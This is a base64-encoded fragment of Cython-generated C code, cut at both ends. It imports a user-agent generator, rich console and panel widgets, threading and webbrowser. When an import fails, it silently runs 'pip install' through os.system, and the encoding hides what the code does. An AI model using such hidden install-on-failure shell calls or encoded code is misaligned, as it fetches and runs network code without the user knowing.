ICBfX3B5eF9MNDRfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0w0M19leGNlcHRpb25faGFuZGxlZDo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTsKICAgIF9fcHl4X0w0N190cnlfZW5kOjsKICB9CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfNywgJl9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5TGlzdF9QYWNrKDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5lcmF0ZV91c2VyX2FnZW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDAsIF9fcHl4X0w1MF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcl9hZ2VudF8yLCBfX3B5eF90XzUsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0MCwgX19weXhfTDUwX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwLCBfX3B5eF9MNTBfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dnYiwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwLCBfX3B5eF9MNTBfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgZ290byBfX3B5eF9MNTVfdHJ5X2VuZDsKICAgIF9fcHl4X0w1MF9lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwoKICAgIAogICAgIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzIsICZfX3B5eF90XzUsICZfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDQxLCBfX3B5eF9MNTJfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwoKICAgICAgCiAgICAgIF9fcHl4X3RfOSA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDQyLCBfX3B5eF9MNTJfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNDIsIF9fcHl4X0w1Ml9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19weXhfdF82ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfanNvbn07CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MiwgX19weXhfTDUyX2V4Y2VwdF9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgfQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgZ290byBfX3B5eF9MNTFfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICB9CgogICAgCiAgICBfX3B5eF9MNTJfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0w1MV9leGNlcHRpb25faGFuZGxlZDo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTsKICAgIF9fcHl4X0w1NV90cnlfZW5kOjsKICB9CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfNywgJl9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5TGlzdF9QYWNrKDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db25zb2xlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDQsIF9fcHl4X0w1OF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmljaF9jb25zb2xlLCBfX3B5eF90XzMsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NCwgX19weXhfTDU4X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29uc29sZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQ0LCBfX3B5eF9MNThfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0NvbnNvbGUsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA0NCwgX19weXhfTDU4X2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogICAgICAKICAgIH0KICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIGdvdG8gX19weXhfTDYzX3RyeV9lbmQ7CiAgICBfX3B5eF9MNThfZXJyb3I6OwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKCiAgICAKICAgICB7CiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygibmUiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF81LCAmX19weXhfdF8zLCAmX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCA0NSwgX19weXhfTDYwX2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTsKCiAgICAgIAogICAgICBfX3B5eF90XzExID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDQ2LCBfX3B5eF9MNjBfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDQ2LCBfX3B5eF9MNjBfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICBfX3B5eF90XzYgPSAxOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfcmljaH07CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ2LCBfX3B5eF9MNjBfZXhjZXB0X2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBnb3RvIF9fcHl4X0w1OV9leGNlcHRpb25faGFuZGxlZDsKICAgIH0KCiAgICAKICAgIF9fcHl4X0w2MF9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDU5X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpOwogICAgX19weXhfTDYzX3RyeV9lbmQ6OwogIH0KCiAgCiAgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xLCAmX19weXhfdF83LCAmX19weXhfdF84KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICB7CgogICAgICAKICAgICAgX19weXhfdF8yID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BhbmVsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDgsIF9fcHl4X0w2Nl9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmljaF9wYW5lbCwgX19weXhfdF8yLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDgsIF9fcHl4X0w2Nl9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BhbmVsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDgsIF9fcHl4X0w2Nl9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUGFuZWwsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCA0OCwgX19weXhfTDY2X2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogICAgICAKICAgIH0KICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgIGdvdG8gX19weXhfTDcxX3RyeV9lbmQ7CiAgICBfX3B5eF9MNjZfZXJyb3I6OwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKCiAgICAKICAgICB7CiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygibmUiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8zLCAmX19weXhfdF8yLCAmX19weXhfdF81KSA8IDApIF9fUFlYX0VSUigwLCA0OSwgX19weXhfTDY4X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKCiAgICAgIAogICAgICBfX3B5eF90XzEwID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNTAsIF9fcHl4X0w2OF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNTAsIF9fcHl4X0w2OF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICBfX3B5eF90XzYgPSAxOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfdGhyZWFkaW5nfTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzksIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNTAsIF9fcHl4X0w2OF9leGNlcHRfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGdvdG8gX19weXhfTDY3X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQoKICAgIAogICAgX19weXhfTDY4X2V4Y2VwdF9lcnJvcjo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTsKICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICBfX3B5eF9MNjdfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7CiAgICBfX3B5eF9MNzFfdHJ5X2VuZDo7CiAgfQoKICAKICB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzgsICZfX3B5eF90XzcsICZfX3B5eF90XzEpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgIHsKCiAgICAgIAogICAgICBfX3B5eF90XzUgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDUyLCBfX3B5eF9MNzRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZywgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDUyLCBfX3B5eF9MNzRfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd2ViYnJvd3NlciwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDUzLCBfX3B5eF9MNzRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dlYmJyb3dzZXIsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCA1MywgX19weXhfTDc0X2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgZ290byBfX3B5eF9MNzlfdHJ5X2VuZDsKICAgIF9fcHl4X0w3NF9lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3